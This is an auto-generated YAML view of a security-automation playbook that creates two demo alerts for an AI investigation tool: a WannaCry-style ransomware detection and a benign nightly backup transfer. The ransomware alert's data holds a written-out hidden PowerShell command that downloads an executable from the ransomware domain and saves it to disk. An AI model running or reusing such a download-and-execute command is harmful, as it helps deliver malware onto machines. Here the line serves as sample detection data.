# Review view of AI Investigation Demo/AI Demo - Generate Two-Verdict Alerts.json. Generated by `soarshelf yaml`; edits are overwritten.
# For reading: install the playbook from the JSON, which is the source of truth.
# Long dashes are written as hyphens here.
collection: AI Investigation Demo
description: Generates the two-verdict AI investigation demo alerts and toggles the
  backup Org Context.
visible: true
playbooks:
- name: AI Demo - Generate Two-Verdict Alerts
  uuid: ed1016cc-2c4a-5877-8b14-52020844e6dd
  description: Creates a ransomware alert (expected Malicious) and a nightly backup
    alert (Inconclusive until the backup is documented in Organization Context).
  is_active: false
  trigger_step_id: start
  steps:
  - type: set_variable
    name: Alert data
    vars:
      ransom_hash: ed01ebfbc9eb5bbea545af4d01bf5f1071661840480439c6e5babe8e080e41aa
      backup_source: '{{ {''alert_type'': ''Data Exfiltration'', ''source_ip'': ''203.0.113.80'',
        ''destination_ip'': ''203.0.113.81'', ''destination_domain'': ''backup-01.corp.example'',
        ''bytes_transferred'': 48318382080, ''protocol'': ''HTTPS'', ''schedule'':
        ''daily 01:30 UTC'', ''change_ticket'': ''CHG-2041''} }}'
      ransom_domain: iuqerfsodp9ifjaposdfjhgosurijfaewrwergwea.com
      ransom_source: '{{ {''alert_type'': ''Malware'', ''host'': ''eng-ws-221'', ''host_ip'':
        ''192.0.2.221'', ''user'': ''j.mendes'', ''process_name'': ''tasksche.exe'',
        ''process_path'': ''C:\\ProgramData\\tasksche.exe'', ''parent_process'': ''powershell.exe
        -nop -w hidden -c iwr http://iuqerfsodp9ifjaposdfjhgosurijfaewrwergwea.com/t.exe
        -o C:\\ProgramData\\tasksche.exe'', ''file_sha256'': ''ed01ebfbc9eb5bbea545af4d01bf5f1071661840480439c6e5babe8e080e41aa'',
        ''network'': {''dest_port'': 445, ''internal_hosts_contacted'': 40, ''window_seconds'':
        120}, ''file_activity'': {''new_extension'': ''.WNCRY'', ''files_modified'':
        1312}, ''change_ticket'': None} }}'
    next: upsert_ransomware_hash
  - type: create_record
    name: Create backup alert
    module: alerts
    fields:
      name: AI Demo - Nightly backup push to backup-01
      type: '{{ ''AlertType'' | picklist(''Data Exfiltration'', ''@id'') }}'
      source: AI Demo Firewall
      status: '{{ ''AlertStatus'' | picklist(''Open'', ''@id'') }}'
      severity: '{{ ''Severity'' | picklist(''Low'', ''@id'') }}'
      sourceIp: 203.0.113.80
      sourcedata: '{{ vars.backup_source | toJSON }}'
      description: Scheduled outbound transfer from file-srv-02 to backup-01 at 01:30
        UTC. Large volume, same destination as the last 30 nights.
    next: return_record_iris
  - type: create_record
    name: Create ransomware alert
    module: alerts
    fields:
      name: AI Demo - Ransomware binary executed on eng-ws-221
      type: '{{ ''AlertType'' | picklist(''Malware'', ''@id'') }}'
      source: AI Demo EDR
      status: '{{ ''AlertStatus'' | picklist(''Open'', ''@id'') }}'
      hostName: eng-ws-221
      severity: '{{ ''Severity'' | picklist(''Critical'', ''@id'') }}'
      sourceIp: 192.0.2.221
      fileHashes: '{{ {''sha256'': [vars.ransom_hash]} }}'
      indicators: '{{ [vars.steps.Upsert_ransomware_hash[''@id''], vars.steps.Upsert_ransomware_domain[''@id'']]
        }}'
      sourcedata: '{{ vars.ransom_source | toJSON }}'
      description: EDR detected execution of tasksche.exe on eng-ws-221 (user j.mendes),
        launched from a PowerShell process that downloaded it. The binary then attempted
        SMB connections on port 445 to 40 internal hosts within 2 minutes and created
        files with the .WNCRY extension.
    next: create_backup_alert
  - type: set_variable
    name: Return Record IRIs
    vars:
      recordIRIs: '{{ [vars.steps.Create_ransomware_alert[''@id''], vars.steps.Create_backup_alert[''@id'']]
        }}'
  - type: start
    name: Start
    module: scenario
    route: 949f2a7a-2e03-5b01-ac06-e830146dbd4d
    requires_record: false
    next: alert_data
  - type: create_record
    name: Upsert ransomware domain
    operation: Overwrite
    module: indicators
    fields:
      value: '{{ vars.ransom_domain }}'
      typeofindicator: '{{ ''IndicatorType'' | picklist(''Domain'', ''@id'') }}'
    on_conflict: keep_existing
    next: create_ransomware_alert
  - type: create_record
    name: Upsert ransomware hash
    operation: Overwrite
    module: indicators
    fields:
      value: '{{ vars.ransom_hash }}'
      typeofindicator: '{{ ''IndicatorType'' | picklist(''FileHash-SHA256'', ''@id'')
        }}'
    on_conflict: keep_existing
    next: upsert_ransomware_domain
